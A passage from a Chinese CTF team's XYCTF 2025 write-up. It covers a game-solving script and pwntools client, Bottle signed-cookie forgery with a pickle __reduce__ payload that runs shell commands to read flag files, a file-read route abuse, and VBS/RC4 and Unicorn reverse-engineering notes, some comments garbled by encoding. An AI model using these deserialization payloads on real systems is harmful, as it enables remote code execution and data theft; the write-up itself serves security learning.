Greedymen\n\n将题目和思路发给claude写出计算优解代码\n\n思路：先拿最大质数；从其他质数相关的大合数开始取；给对面拿最少分数前提取剩下的数字\n\n算法代码：\n\n```cpp\n#include <iostream>\n#include <vector>\n#include <set>\n#include <algorithm>\n#include <map>\n\nusing namespace std;\n\nvector<int> getFactors(int n)\n{\n    vector<int> factors;\n    for (int i = 1; i <= n; i++)\n    {\n        if (n % i == 0)\n            factors.push_back(i);\n    }\n    return factors;\n}\n\nbool isPrime(int n)\n{\n    if (n < 2)\n        return false;\n    for (int i = 2; i * i <= n; i++)\n    {\n        if (n % i == 0)\n            return false;\n    }\n    return true;\n}\n\nstruct Evaluation\n{\n    int immediateGain;\n    int futureImpact;\n    int numFactors;\n\n    bool operator<(const Evaluation &other) const\n    {\n        if (immediateGain != other.immediateGain)\n            return immediateGain < other.immediateGain;\n        if (futureImpact != other.futureImpact)\n            return futureImpact < other.futureImpact;\n        return numFactors > other.numFactors;\n    }\n};\n\nconst int NEG_INF = -1000000000; // 使用整数常量\n\nEvaluation evaluateChoice(int num, const set<int> &usedNumbers, int maxNum)\n{\n    vector<int> factors = getFactors(num);\n    int opponentGain = 0;\n    set<int> newUsed = usedNumbers;\n    newUsed.insert(num);\n\n    for (int factor : factors)\n    {\n        if (factor != num && usedNumbers.find(factor) == usedNumbers.end())\n        {\n            opponentGain += factor;\n        }\n    }\n\n    int futureOptions = 0;\n    for (int i = maxNum; i >= 2; i--)\n    {\n        if (newUsed.find(i) == newUsed.end())\n        {\n            vector<int> iFactors = getFactors(i);\n            bool hasUnusedFactor = false;\n            for (int f : iFactors)\n            {\n                if (f != i && newUsed.find(f) == newUsed.end())\n                {\n                    hasUnusedFactor = true;\n                    break;\n                }\n            }\n            if (hasUnusedFactor)\n                futureOptions++;\n        }\n    }\n\n    return {num - opponentGain, futureOptions, (int)factors.size()};\n}\n\nvoid solveLevel(int maxNum, int moves)\n{\n    set<int> used;\n    vector<int> choices;\n    int myScore = 0;\n    int opponentScore = 0;\n    map<int, vector<int>> factorMap;\n\n    // 预计算所有数的因数\n    for (int i = 1; i <= maxNum; i++)\n    {\n        factorMap[i] = getFactors(i);\n    }\n\n    while (moves > 0)\n    {\n        int bestNum = -1;\n        Evaluation bestEval = {NEG_INF, NEG_INF, 1000}; // 使用整数常量\n\n        for (int i = maxNum; i >= 2; i--)\n        {\n            if (used.find(i) != used.end())\n                continue;\n\n            bool hasUnusedFactor = false;\n            for (int factor : factorMap[i])\n            {\n                if (factor != i && used.find(factor) == used.end())\n                {\n                    hasUnusedFactor = true;\n                    break;\n                }\n            }\n\n            if (!hasUnusedFactor)\n                continue;\n\n            Evaluation eval = evaluateChoice(i, used, maxNum);\n            if (bestEval < eval)\n            {\n                bestEval = eval;\n                bestNum = i;\n            }\n        }\n\n        if (bestNum == -1)\n            break;\n\n        choices.push_back(bestNum);\n        myScore += bestNum;\n        used.insert(bestNum);\n\n        for (int factor : factorMap[bestNum])\n        {\n            if (factor != bestNum && used.find(factor) == used.end())\n            {\n                opponentScore += factor;\n                used.insert(factor);\n            }\n        }\n\n        moves--;\n    }\n\n    // 计算剩余数字\n    for (int i = 1; i <= maxNum; i++)\n    {\n        if (used.find(i) == used.end())\n        {\n            opponentScore += i;\n        }\n    }\n\n    cout << \"Level \" << maxNum << \" (\" << moves << \" moves):\\n\";\n    cout << \"choices = [\";\n    for (size_t i = 0; i < choices.size(); i++)\n    {\n        cout << choices[i];\n        if (i < choices.size() - 1)\n            cout << \", \";\n    }\n    cout << \"]\\n\";\n\n    cout << \"My Score: \" << myScore << \"\\n\";\n    cout << \"Opponent Score: \" << opponentScore << \"\\n\";\n    cout << \"Score Difference: \" << myScore - opponentScore << \"\\n\\n\";\n}\n\nint main()\n{\n    solveLevel(50, 19);  // Level 1\n    solveLevel(100, 37); // Level 2\n    solveLevel(200, 76); // Level 3\n    return 0;\n}\n```\n\n输出：\n\n```cpp\nLevel 50 (0 moves):\nchoices = [47, 49, 35, 39, 26, 46, 33, 45, 38, 44, 34, 50, 30, 28, 42, 40, 32, 24, 36]\nMy Score: 718\nOpponent Score: 557\nScore Difference: 161\n\nLevel 100 (0 moves):\nchoices = [97, 95, 91, 85, 77, 93, 62, 87, 99, 81, 94, 69, 86, 92, 63, 82, 76, 66, 74, 88, 54, 98, 75, 50, 100, 70, 68, 56, 84, 60, 90, 52, 78, 80, 64, 48, 72]\nMy Score: 2856\nOpponent Score: 2194\nScore Difference: 662\n\nLevel 200 (0 moves):\nchoices = [199, 187, 169, 185, 161, 155, 183, 122, 177, 145, 175, 133, 159, 171, 153, 194, 141, 188, 178, 129, 172, 166, 123, 164, 158, 117, 195, 130, 105, 189, 147, 135, 98, 196, 182, 165, 110, 154, 148, 146, 78, 156, 104, 114, 190, 152, 142, 102, 170, 136, 134, 126, 124, 186, 90, 180, 140, 116, 174, 120, 80, 160, 128, 112, 168, 108, 162, 100, 150, 96, 144, 92, 138, 88, 132, 198]\nMy Score: 11094\nOpponent Score: 9006\nScore Difference: 2088\n```\n\n```python\nfrom pwn import *\n\n\ncontext.log_level = 'debug'\nsh=remote(\"47.94.204.178\",26629 )\n\nsh.recvuntil(b'3.Quit\\n')\nsh.sendline(b'1')\n\n# 这边打的时候Level1使用的是之前手动取的值\nnums=[[47, 49, 21, 39, 27, 33, 44, 40, 42, 45, 46, 48, 50, 38, 36, 34],\n      [97, 95, 91, 85, 77, 93, 62, 87, 99, 81, 94, 69, 86, 92, 63, 82, 76, 66, 74, 88, 54, 98, 75, 50, 100, 70, 68, 56, 84, 60, 90, 52, 78, 80, 64, 96, 72],\n      [199, 187, 169, 185, 161, 155, 183, 122, 177, 145, 175, 133, 159, 171, 153, 194, 141, 188, 178, 129, 172, 166, 123, 164, 158, 117, 195, 130, 105, 189, 147, 135, 98, 196, 182, 165, 110, 154, 148, 146, 78, 156, 104, 114, 190, 152, 142, 102, 170, 136, 134, 126, 124, 186, 90, 180, 140, 116, 174, 120, 80, 160, 128, 112, 168, 108, 162, 100, 150, 96, 144, 92, 138, 88, 132, 198]]\nfor num in nums:\n    sh.recvuntil(b'ers\\n')\n    for i in num:\n        sh.recvuntil(b'ber:')\n        sh.sendline(str(i).encode())\n\nsh.recvlines()\nsh.interactive()\n```\n\nb\"Congratulations!, Here's Your Flag flag{Greed, is......key of the life.}\\n\"\n\n","slug":"XYCTF25-不知道-WP","published":1,"updated":"2025-04-14T11:02:09.719Z","comments":1,"layout":"post","photos":[],"_id":"cm9r3mmeu000bf0lsbflpcgx8","content":"<h1 id=\"战队名：不知道\"><a href=\"#战队名：不知道\" class=\"headerlink\" title=\"战队名：不知道\"></a>战队名：不知道</h1><p><strong>排名</strong>：<strong>1</strong></p>\n<p><img src=\"/images/e859cd5cae823fc6e9ecd736647c7dab-1744626745337-9.png\" loading=\"lazy\"></p>\n<h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><h3 id=\"ez-puzzle\"><a href=\"#ez-puzzle\" class=\"headerlink\" title=\"ez_puzzle\"></a>ez_puzzle</h3><p>查看js源码，找到_3KH_函数判断输出flag的地方</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>G <span class=\"token operator\">></span> yw4<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      alert<span class=\"token punctuation\">(</span>O<span class=\"token punctuation\">[</span>s74<span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>J74<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n      alert<span class=\"token punctuation\">(</span>$vfeRha_calc<span class=\"token punctuation\">(</span>S74 <span class=\"token operator\">+</span> G <span class=\"token operator\">/</span> Rw4<span class=\"token punctuation\">,</span> Y74<span class=\"token punctuation\">,</span> $v5sNVR<span class=\"token punctuation\">(</span>vS4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>运行到此处即可</p>\n<p><img src=\"/images/image-1744626745337-3.png\" loading=\"lazy\"></p>\n<h3 id=\"SignIn\"><a href=\"#SignIn\" class=\"headerlink\" title=\"SignIn\"></a>SignIn</h3><p>访问&#x2F;secret 获得cookie </p>\n<p>疑似Bottle 框架的 signed cookie</p>\n<p>signed cookie 构造</p>\n<p><code>!4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=</code>是 base 64 编码的   HMAC - SHA 1 签名</p>\n<p><code>gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu</code>是 base64 编码的 Python 数据，反序列化后应该是</p>\n<p>也就是说第二端可以通过pickle 序列化攻击实现 rce</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> bottle <span class=\"token keyword\">import</span> SimpleCookie\n<span class=\"token keyword\">import</span> base64\n<span class=\"token keyword\">import</span> hmac\n<span class=\"token keyword\">import</span> hashlib\n<span class=\"token keyword\">import</span> pickle\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">make_signed_cookie</span><span class=\"token punctuation\">(</span>secret<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    pickled <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n    digest <span class=\"token operator\">=</span> hmac<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>secret<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> pickled<span class=\"token punctuation\">,</span> hashlib<span class=\"token punctuation\">.</span>sha1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    cookie <span class=\"token operator\">=</span> <span class=\"token string\">'!'</span> <span class=\"token operator\">+</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>digest<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'?'</span> <span class=\"token operator\">+</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>pickled<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> cookie\n\n<span class=\"token comment\"># 假设你已经拿到 secret 内容：</span>\nsecret <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>  <span class=\"token comment\"># ← 替换成实际值</span>\ndata <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">&#125;</span>\nsigned_cookie <span class=\"token operator\">=</span> make_signed_cookie<span class=\"token punctuation\">(</span>secret<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"伪造的 Cookie 值：\"</span><span class=\"token punctuation\">,</span> signed_cookie<span class=\"token punctuation\">)</span></code></pre>\n\n<p>通过&#x2F;download 读取 签名</p>\n<p><img src=\"/images/image-20250406194123399-1744626745337-4.png\" loading=\"lazy\"></p>\n<pre class=\"language-vbnet\" data-language=\"vbnet\"><code class=\"language-vbnet\">Hell0_H@cker_Y0u_A3r_Sm@r7</code></pre>\n\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> bottle <span class=\"token keyword\">import</span> SimpleCookie\n<span class=\"token keyword\">import</span> base64\n<span class=\"token keyword\">import</span> hmac\n<span class=\"token keyword\">import</span> hashlib\n<span class=\"token keyword\">import</span> pickle\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">make_signed_cookie</span><span class=\"token punctuation\">(</span>secret<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    pickled <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n    digest <span class=\"token operator\">=</span> hmac<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>secret<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> pickled<span class=\"token punctuation\">,</span> hashlib<span class=\"token punctuation\">.</span>sha1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    cookie <span class=\"token operator\">=</span> <span class=\"token string\">'!'</span> <span class=\"token operator\">+</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>digest<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'?'</span> <span class=\"token operator\">+</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>pickled<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> cookie\n\nsecret <span class=\"token operator\">=</span> <span class=\"token string\">\"Hell0_H@cker_Y0u_A3r_Sm@r7\"</span>  \n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Data</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__reduce__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n         \n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"__import__('os').popen('cat /flag*>/test.txt').read()\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\ndata <span class=\"token operator\">=</span> Data<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nencoded <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>encoded<span class=\"token punctuation\">)</span>\nsigned_cookie <span class=\"token operator\">=</span> make_signed_cookie<span class=\"token punctuation\">(</span>secret<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"伪造的 Cookie 值：\"</span><span class=\"token punctuation\">,</span> signed_cookie<span class=\"token punctuation\">)</span></code></pre>\n\n<p>伪造cookie成功后再通过download 路由实现任意文件读取</p>\n<p><img src=\"/images/image-20250406200423921-1744626745337-5.png\" loading=\"lazy\"></p>\n<h2 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h2><h3 id=\"WARMUP\"><a href=\"#WARMUP\" class=\"headerlink\" title=\"WARMUP\"></a>WARMUP</h3><p>网上抄的VBS解密代码</p>\n<pre class=\"language-vbscript\" data-language=\"vbscript\"><code class=\"language-vbscript\">Function Defuscator(vbs)\n    Dim t\n    t &#x3D; InStr(1, vbs, &quot;Execute&quot;, 1)\n    t &#x3D; Mid(vbs, t + Len(&quot;Execute&quot;))\n    t &#x3D; Eval(t)\n    Defuscator &#x3D; t\nEnd Function\n\nDim fso, i, outFile\nConst ForReading &#x3D; 1, ForWriting &#x3D; 2\nSet fso &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;)\n\n    &#39; 创建或打开一个文件用于写入输出\n    Set outFile &#x3D; fso.OpenTextFile(&quot;output.txt&quot;, ForWriting, True)\n\n        For i &#x3D; 0 To WScript.Arguments.Count - 1\n        Dim FileName\n        FileName &#x3D; WScript.Arguments(i)\n        Dim MyFile\n        Set MyFile &#x3D; fso.OpenTextFile(FileName, ForReading)\n            Dim vbs\n            vbs &#x3D; MyFile.ReadAll\n            outFile.WriteLine Defuscator(vbs)\n            MyFile.Close\n        Next\n\n        outFile.Close\n        Set fso &#x3D; Nothing</code></pre>\n\n<p>output.txt:</p>\n<pre class=\"language-vbscript\" data-language=\"vbscript\"><code class=\"language-vbscript\">MsgBox &quot;Dear CTFER. Have fun in XYCTF 2025!&quot;\nflag &#x3D; InputBox(&quot;Enter the FLAG:&quot;, &quot;XYCTF&quot;)\nwefbuwiue &#x3D; &quot;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&quot; &#39; 棰勮鐨凴C4鍔犲瘑缁撴灉锛堝崄鍏繘鍒舵牸寮忥級\nqwfe &#x3D; &quot;rc4key&quot;\n\n&#39; 淇鍚庣殑RC4鍔犲瘑鍑芥暟\nFunction RunRC(sMessage, strKey)\n    Dim kLen, i, j, temp, pos, outHex\n    Dim s(255), k(255)\n    \n    &#39; 鍒濆鍖栧瘑閽?\n    kLen &#x3D; Len(strKey)\n    For i &#x3D; 0 To 255\n        s(i) &#x3D; i\n        k(i) &#x3D; Asc(Mid(strKey, (i Mod kLen) + 1, 1)) &#39; 瀵嗛挜浣跨敤ASCII缂栫爜\n    Next\n    \n    &#39; KSA瀵嗛挜璋冨害\n    j &#x3D; 0\n    For i &#x3D; 0 To 255\n        j &#x3D; (j + s(i) + k(i)) Mod 256\n        temp &#x3D; s(i)\n        s(i) &#x3D; s(j)\n        s(j) &#x3D; temp\n    Next\n    \n    &#39; PRGA鍔犲瘑娴佺▼\n    i &#x3D; 0 : j &#x3D; 0 : outHex &#x3D; &quot;&quot;\n    For pos &#x3D; 1 To Len(sMessage)\n        i &#x3D; (i + 1) Mod 256\n        j &#x3D; (j + s(i)) Mod 256\n        temp &#x3D; s(i)\n        s(i) &#x3D; s(j)\n        s(j) &#x3D; temp\n        \n        &#39; 鍔犲瘑骞惰浆涓哄崄鍏繘鍒?\n        Dim plainChar, cipherByte\n        plainChar &#x3D; Asc(Mid(sMessage, pos, 1)) &#39; 鏄庢枃鎸堿SCII澶勭悊\n        cipherByte &#x3D; s((s(i) + s(j)) Mod 256) Xor plainChar\n        outHex &#x3D; outHex &amp; Right(&quot;0&quot; &amp; Hex(cipherByte), 2)\n    Next\n    \n    RunRC &#x3D; outHex\nEnd Function\n\n&#39; 涓婚獙璇侀€昏緫\nIf LCase(RunRC(flag, qwfe)) &#x3D; LCase(wefbuwiue) Then\n    MsgBox &quot;Congratulations! Correct FLAG!&quot;\nElse\n    MsgBox &quot;Wrong flag.&quot;\nEnd If\n\n\n</code></pre>\n\n<p>RC4解密，密钥为<strong>rc4key</strong></p>\n<p><img src=\"/images/1-1744626745337-7.png\" loading=\"lazy\"></p>\n<p>flag{We1c0me_t0_XYCTF_2025_reverse_ch@lleng3_by_th3_w@y_p3cd0wn‘s_chall_is_r3@lly_gr3@t_&amp;_fuN!}</p>\n<h3 id=\"ezVM\"><a href=\"#ezVM\" class=\"headerlink\" title=\"ezVM\"></a>ezVM</h3><p>通过字符串界面里的unicorn和加密函数的一些特征发现是使用了unicorn框架调用了一串代码。</p>\n<p>找一个使用unicorn框架的程序进行bindiff恢复一些unicorn函数的符号。</p>\n<p>发现是调用了一串ARM64的代码字节进行模拟执行，将输入字符串传入加密返回，并附上了一些data和栈空间初始化。</p>\n<p><img src=\"/images/2-1744626745337-6.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/4-1744626745337-8.png\" loading=\"lazy\"></p>\n<p>将以上调用write写入的数据提取，随便找一个ARM64框架的.so复制到对应地址，以便反编译看代码。</p>\n<p>最后得到一个函数，很清晰的看出里面是一个VM虚拟机执行的流程。</p>\n<p><img src=\"/images/5-1744626745337-10.png\" loading=\"lazy\"></p>\n<p>使用c++编写代码调用unicorn库进行模拟。</p>\n<p>使用Hook，在关键计算地址处进行Hook，输出各个计算流程以及数据。</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;Windows.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;vector></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"data.hpp\"</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"unicorn/unicorn.h\"</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">pragma</span> <span class=\"token expression\"><span class=\"token function\">comment</span><span class=\"token punctuation\">(</span>lib<span class=\"token punctuation\">,</span></span><span class=\"token string\">\"unicorn-import.lib\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">hook_code</span><span class=\"token punctuation\">(</span>uc_engine<span class=\"token operator\">*</span> uc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">uint64_t</span> address<span class=\"token punctuation\">,</span> <span class=\"token keyword\">uint32_t</span> size<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span><span class=\"token operator\">*</span> user_data<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint64_t</span> w0<span class=\"token punctuation\">,</span>w1<span class=\"token punctuation\">,</span>w2<span class=\"token punctuation\">,</span>w3<span class=\"token punctuation\">,</span>w4<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address <span class=\"token operator\">==</span> <span class=\"token number\">0x1fac</span><span class=\"token punctuation\">)</span> \n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W1<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W0<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W3 = W1 ^ W0 --- %llx ^ %llx = %llx\\n\"</span><span class=\"token punctuation\">,</span> w1<span class=\"token punctuation\">,</span>w0<span class=\"token punctuation\">,</span>w1<span class=\"token operator\">^</span>w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address <span class=\"token operator\">==</span> <span class=\"token number\">0x2BE4</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W1<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W0<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W3 = W1 >> W0 --- %llx >> %llx = %llx\\n\"</span><span class=\"token punctuation\">,</span> w1<span class=\"token punctuation\">,</span> w0<span class=\"token punctuation\">,</span> w1 <span class=\"token operator\">>></span> w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address <span class=\"token operator\">==</span> <span class=\"token number\">0x2DB4</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W1<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W0<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W3 = W1 &lt;&lt; W0 --- %llx &lt;&lt; %llx = %llx\\n\"</span><span class=\"token punctuation\">,</span> w1<span class=\"token punctuation\">,</span> w0<span class=\"token punctuation\">,</span> w1 <span class=\"token operator\">&lt;&lt;</span> w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address <span class=\"token operator\">==</span> <span class=\"token number\">0x232C</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W3<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W0<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W2 = W0 &amp; W3 --- %llx &amp; %llx = %llx\\n\"</span><span class=\"token punctuation\">,</span> w0<span class=\"token punctuation\">,</span> w3<span class=\"token punctuation\">,</span> w0 <span class=\"token operator\">&amp;</span> w3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address <span class=\"token operator\">==</span> <span class=\"token number\">0x2054</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W3<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W0<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W2 = W0 ^ W3 --- %llx ^ %llx = %llx\\n\"</span><span class=\"token punctuation\">,</span> w0<span class=\"token punctuation\">,</span> w3<span class=\"token punctuation\">,</span> w3 <span class=\"token operator\">^</span> w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address <span class=\"token operator\">==</span> <span class=\"token number\">0x2238</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W3<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W0<span class=\"token punctuation\">,</span> <span class=\"token 